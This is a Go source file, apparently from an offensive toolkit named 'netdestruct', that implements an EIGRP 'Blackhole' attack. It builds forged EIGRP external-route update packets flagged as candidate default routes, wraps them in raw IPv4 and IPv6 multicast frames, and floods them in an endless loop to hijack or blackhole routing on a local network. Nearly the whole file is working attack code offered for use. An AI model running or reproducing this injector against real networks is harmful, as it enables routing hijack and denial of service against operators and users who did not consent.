package eigrp

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/signal"
	"sync/atomic"
	"time"

	"netdestruct/libs/dos/routing"
)

const (
	eigrpTag         = "\x1b[34m[EIGRP]\x1b[0m"
	eigrpProto       = 88
	eigrpIPv4Mcast   = "224.0.0.10"
	eigrpIPv6Mcast   = "ff02::a"
	extRouteTLV      = 0x0103
	extRouteTLVv6    = 0x0403
	flagCandidateDef = 0x02
)

var eigrpL2Mcast = [6]byte{0x01, 0x00, 0x5E, 0x00, 0x00, 0x0A}

type rawSocket interface {
	Send(frame []byte) error
	Close() error
}

// Blackhole injects forged EIGRP external routes.
type Blackhole struct {
	Interface string
	AS        uint32
	SourceIP  string
	Target    string
}

func (b *Blackhole) Run() error {
	iface, err := net.InterfaceByName(b.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", b.Interface, err)
	}
	src := net.ParseIP(b.SourceIP)
	if src == nil {
		return fmt.Errorf("invalid --src %q", b.SourceIP)
	}
	routes, err := routing.ExpandTargets(b.Target)
	if err != nil {
		return err
	}

	sock, err := openRawSocket(iface)
	if err != nil {
		return err
	}
	defer sock.Close()

	srcMAC := iface.HardwareAddr
	if len(srcMAC) != 6 {
		return fmt.Errorf("interface %s has no MAC address", b.Interface)
	}

	var total int64
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		fmt.Printf("\n%s Stopped. Total updates sent: %d\n", eigrpTag, atomic.LoadInt64(&total))
		os.Exit(0)
	}()

	fmt.Printf("%s Injecting external routes on %s (AS %d, src %s, routes %d)\n",
		eigrpTag, b.Interface, b.AS, src, len(routes))
	fmt.Printf("%s Press Ctrl+C to stop.\n", eigrpTag)

	for {
		for _, route := range routes {
			var frame []byte
			if v4 := route.Addr.To4(); v4 != nil {
				frame = buildIPv4Frame(srcMAC, src.To4(), buildIPv4Update(b.AS, src.To4(), v4, route.PrefixLen, flagCandidateDef), 1)
			} else {
				frame = buildIPv6Frame(srcMAC, src.To16(), buildIPv6Update(b.AS, src.To4(), route.Addr.To16(), route.PrefixLen))
			}
			if frame == nil {
				continue
			}
			if err := sock.Send(frame); err != nil {
				return fmt.Errorf("send: %w", err)
			}
			atomic.AddInt64(&total, 1)
			time.Sleep(10 * time.Millisecond)
		}
	}
}

func buildIPv4Update(asn uint32, src, dst net.IP, prefixLen int, extFlags byte) []byte {
	tlv := buildIPv4ExtRouteTLV(dst, prefixLen, src, src, asn, extFlags)
	return buildEIGRPPacket(asn, tlv)
}

func buildIPv6Update(asn uint32, originRouter net.IP, dst net.IP, prefixLen int) []byte {
	tlv := buildIPv6ExtRouteTLV(dst, prefixLen, dst, originRouter, asn)
	return buildEIGRPPacket(asn, tlv)
}

func buildEIGRPPacket(asn uint32, tlv []byte) []byte {
	pkt := make([]byte, 20+len(tlv))
	pkt[0] = 2
	pkt[1] = 1 // Update
	binary.BigEndian.PutUint32(pkt[16:20], asn)
	copy(pkt[20:], tlv)
	binary.BigEndian.PutUint16(pkt[2:4], onesComplementChecksum(pkt))
	return pkt
}

func buildIPv4ExtRouteTLV(dst net.IP, prefixLen int, nexthop, origin net.IP, asn uint32, extFlags byte) []byte {
	dstBytes := routing.EigrpIPv4Bytes(dst, prefixLen)
	bodyLen := 41 + len(dstBytes)
	tlv := make([]byte, 4+bodyLen)
	binary.BigEndian.PutUint16(tlv[0:2], extRouteTLV)
	binary.BigEndian.PutUint16(tlv[2:4], uint16(4+bodyLen))
	off := 4
	copy(tlv[off:off+4], nexthop.To4())
	off += 4
	copy(tlv[off:off+4], origin.To4())
	off += 4
	binary.BigEndian.PutUint32(tlv[off:off+4], asn)
	off += 4
	// tag, external metric, reserved
	off += 12
	tlv[off] = 3 // static route
	off++
	tlv[off] = extFlags
	off++
	// delay, bandwidth, mtu, hopcount, reliability, load, reserved2
	off += 16
	tlv[off] = byte(prefixLen)
	off++
	copy(tlv[off:], dstBytes)
	return tlv
}

func buildIPv6ExtRouteTLV(dst net.IP, prefixLen int, nexthop, origin net.IP, asn uint32) []byte {
	dstBytes := routing.EigrpIPv6Bytes(dst, prefixLen)
	bodyLen := 57 + len(dstBytes)
	tlv := make([]byte, 4+bodyLen)
	binary.BigEndian.PutUint16(tlv[0:2], extRouteTLVv6)
	binary.BigEndian.PutUint16(tlv[2:4], uint16(4+bodyLen))
	off := 4
	copy(tlv[off:off+16], nexthop.To16())
	off += 16
	copy(tlv[off:off+4], origin.To4())
	off += 4
	binary.BigEndian.PutUint32(tlv[off:off+4], asn)
	off += 4
	off += 12
	tlv[off] = 3
	off++
	tlv[off] = flagCandidateDef
	off += 17
	tlv[off] = byte(prefixLen)
	off++
	copy(tlv[off:], dstBytes)
	return tlv
}

func buildIPv4Frame(srcMAC net.HardwareAddr, srcIP net.IP, payload []byte, ttl byte) []byte {
	ipLen := 20 + len(payload)
	frameLen := 14 + ipLen
	frame := make([]byte, frameLen)
	copy(frame[0:6], eigrpL2Mcast[:])
	copy(frame[6:12], srcMAC)
	binary.BigEndian.PutUint16(frame[12:14], 0x0800)
	// IPv4 header
	frame[14] = 0x45
	binary.BigEndian.PutUint16(frame[16:18], uint16(ipLen))
	frame[18] = ttl
	frame[19] = eigrpProto
	copy(frame[22:26], srcIP.To4())
	copy(frame[26:30], net.ParseIP(eigrpIPv4Mcast).To4())
	// checksum
	binary.BigEndian.PutUint16(frame[20:22], ipChecksum(frame[14:14+ipLen]))
	copy(frame[34:], payload)
	return frame
}

func buildIPv6Frame(srcMAC net.HardwareAddr, srcIP net.IP, payload []byte) []byte {
	ipLen := 40 + len(payload)
	frameLen := 14 + ipLen
	frame := make([]byte, frameLen)
	mcastMAC := ipv6MulticastMAC(net.ParseIP(eigrpIPv6Mcast))
	copy(frame[0:6], mcastMAC[:])
	copy(frame[6:12], srcMAC)
	binary.BigEndian.PutUint16(frame[12:14], 0x86DD)
	frame[14] = 0x60
	binary.BigEndian.PutUint16(frame[18:20], uint16(len(payload)))
	frame[20] = eigrpProto
	copy(frame[22:38], srcIP.To16())
	copy(frame[38:54], net.ParseIP(eigrpIPv6Mcast).To16())
	copy(frame[54:], payload)
	return frame
}

func ipv6MulticastMAC(ip net.IP) [6]byte {
	v6 := ip.To16()
	return [6]byte{0x33, 0x33, v6[12], v6[13], v6[14], v6[15]}
}

func ipChecksum(data []byte) uint16 {
	return onesComplementChecksum(data)
}

func onesComplementChecksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(data); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}
